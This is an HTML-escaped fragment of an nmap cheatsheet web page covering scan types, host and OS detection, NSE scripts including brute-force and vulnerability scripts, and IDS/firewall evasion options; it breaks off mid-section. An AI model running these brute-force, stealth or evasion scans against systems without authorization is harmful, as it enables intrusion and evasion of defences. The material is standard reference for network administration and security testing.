id=\"nmap-cheatsheet---complete-reference-guide\"\u003eNmap Cheatsheet - Complete Reference Guide\u003c/h1\u003e\n\u003ch2 id=\"basic-scanning\"\u003eBasic Scanning\u003c/h2\u003e\n\u003ch3 id=\"simple-host-scan\"\u003eSimple Host Scan\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic scan of single host\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap 192.168.1.100\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Scan multiple hosts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap 192.168.1.100-110\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap 192.168.1.100,102,104\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Scan subnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap 192.168.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"common-port-ranges\"\u003eCommon Port Ranges\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Scan top 1000 ports (default)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Scan specific ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p 80,443,22,21 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Scan port ranges\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p 1-65535 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p- target  \u003cspan class=\"c1\"\u003e# All ports shorthand\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Scan top ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --top-ports \u003cspan class=\"m\"\u003e100\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"host-discovery\"\u003eHost Discovery\u003c/h2\u003e\n\u003ch3 id=\"ping-scans\"\u003ePing Scans\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# No port scan, just ping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sn 192.168.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP SYN ping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -PS target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP ACK ping  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -PA target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# UDP ping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -PU target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Skip ping (assume host is up)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -Pn target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"arp-discovery\"\u003eARP Discovery\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ARP ping scan (local network)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -PR 192.168.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# List scan (no ping, no port scan)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sL 192.168.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"port-scanning-techniques\"\u003ePort Scanning Techniques\u003c/h2\u003e\n\u003ch3 id=\"tcp-scans\"\u003eTCP Scans\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP SYN scan (default, stealthy)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sS target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP Connect scan (full connection)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sT target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP ACK scan (firewall detection)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sA target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP Window scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sW target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TCP Maimon scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sM target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"udp-scans\"\u003eUDP Scans\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# UDP scan (slow but important)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sU target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Combined TCP/UDP scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sS -sU target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Fast UDP scan (top ports)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sU --top-ports \u003cspan class=\"m\"\u003e100\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"specialized-scans\"\u003eSpecialized Scans\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# FIN scan (stealth)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sF target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# NULL scan (stealth)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sN target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Xmas scan (stealth)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sX target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Idle scan (ultra stealth)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sI zombie_host target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"service--version-detection\"\u003eService \u0026amp; Version Detection\u003c/h2\u003e\n\u003ch3 id=\"version-detection\"\u003eVersion Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Service version detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sV target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Aggressive version detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sV --version-intensity \u003cspan class=\"m\"\u003e9\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Light version detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sV --version-intensity \u003cspan class=\"m\"\u003e2\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"os-detection\"\u003eOS Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# OS fingerprinting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -O target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Aggressive OS detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -O --osscan-guess target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# OS detection with version scanning\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -O -sV target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"combined-detection\"\u003eCombined Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Aggressive scan (OS, version, scripts, traceroute)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -A target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Standard aggressive scan with common ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -A -T4 target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"script-engine-nse\"\u003eScript Engine (NSE)\u003c/h2\u003e\n\u003ch3 id=\"default-scripts\"\u003eDefault Scripts\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Run default scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sC target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003edefault target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Combine with version detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sC -sV target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"script-categories\"\u003eScript Categories\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Vulnerability scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003evuln target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Authentication scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003eauth target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Brute force scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrute target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Discovery scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ediscovery target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Malware detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003emalware target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"specific-scripts\"\u003eSpecific Scripts\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HTTP enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp-enum target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SMB enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003esmb-enum-shares target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DNS information\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003edns-brute target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSL certificate info\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003essl-cert target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Heartbleed detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003essl-heartbleed target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"script-arguments\"\u003eScript Arguments\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Pass arguments to scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp-form-brute --script-args \u003cspan class=\"nv\"\u003euserdb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers.txt,passdb\u003cspan class=\"o\"\u003e=\u003c/span\u003epass.txt target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Multiple script arguments\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --script\u003cspan class=\"o\"\u003e=\u003c/span\u003esmb-brute --script-args \u003cspan class=\"nv\"\u003euserdb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers.txt,unpwdb.timelimit\u003cspan class=\"o\"\u003e=\u003c/span\u003e60s target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"stealth--evasion\"\u003eStealth \u0026amp; Evasion\u003c/h2\u003e\n\u003ch3 id=\"timing-templates\"\u003eTiming Templates\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Paranoid (very slow, IDS evasion)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -T0 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Sneaky (slow, IDS evasion)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -T1 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Polite (normal, no bandwidth flooding)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -T2 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Normal (default)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -T3 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Aggressive (fast, reliable networks)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -T4 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Insane (very fast, sacrifice accuracy)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -T5 target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"firewall-evasion\"\u003eFirewall Evasion\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Fragment packets\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -f target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify MTU\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 